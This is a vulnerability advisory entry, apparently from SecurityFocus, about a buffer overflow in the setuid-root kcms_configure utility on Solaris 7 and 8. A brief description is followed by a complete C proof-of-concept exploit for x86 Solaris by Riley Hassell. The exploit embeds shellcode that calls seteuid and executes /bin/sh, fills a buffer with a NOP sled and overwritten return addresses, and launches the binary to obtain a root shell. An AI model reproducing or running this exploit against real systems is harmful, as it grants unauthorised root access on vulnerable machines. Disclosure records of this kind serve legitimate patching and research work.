source: http://www.securityfocus.com/bid/2558/info

The Kodak Color Management System, or KCMS, is a package that ships with workstation installations of Solaris 7 and 8. kcms_configure, a part of KCMS, is vulnerable to a buffer overflow if it is passed an overly long string on the command-line by a local user. kcms_configure is installed setuid root, so a buffer overflow can lead to arbitrary code execution as root.

An exploit for x86 Solaris is available to attackers. 

/*
 Command line argument overflow
 /usr/openwin/bin/kcms_configure

 Proof of Concept Exploitation
 Riley Hassell
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFLEN  1100

/* seteuid/exec shellcode  */
char shell[] =
"\xeb\x0a\x9a\x01\x02\x03\x5c\x07\x04\xc3\xeb\x05\xe8\xf9\xff\xff\xff"
"\x5e\x29\xc0\x88\x46\xf7\x89\x46\xf2\x50\xb0\x8d\xe8\xe0\xff\xff\xff"
"\x29\xc0\x50\xb0\x17\xe8\xd6\xff\xff\xff\xeb\x1f\x5e\x8d\x1e\x89\x5e"
"\x0b\x29\xc0\x88\x46\x19\x89\x46\x14\x89\x46\x0f\x89\x46\x07\xb0"
"\x3b\x8d\x4e\x0b\x51\x51\x53\x50\xeb\x18\xe8\xdc\xff\xff\xff\x2f\x62"
"\x69\x6e\x2f\x73\x68\x01\x01\x01\x01\x02\x02\x02\x02\x03\x03\x03"
"\x03\x9a\x04\x04\x04\x04\x07\x04";

char buf[BUFLEN];
unsigned long int nop, esp;
long int offset = 0;

unsigned long int get_esp() { __asm__("movl %esp,%eax");}

int main (int argc, char *argv[])
{
        int i;
        if (argc > 1)
        offset = strtol(argv[1], NULL, 0);
        else
             offset = -300;
            nop = 600;
        esp = get_esp();
        memset(buf, 0x90, BUFLEN);
        memcpy(buf+600, shell, strlen(shell));
        for (i = nop+strlen(shell)+1; i <= BUFLEN-4; i += 4)
        *((int *) &buf[i]) = esp+offset;
         buf[BUFLEN-1] = '\0';
        execl("/usr/openwin/bin/kcms_configure", "eEye",
"-o","-S","X",buf,NULL);
        return;
}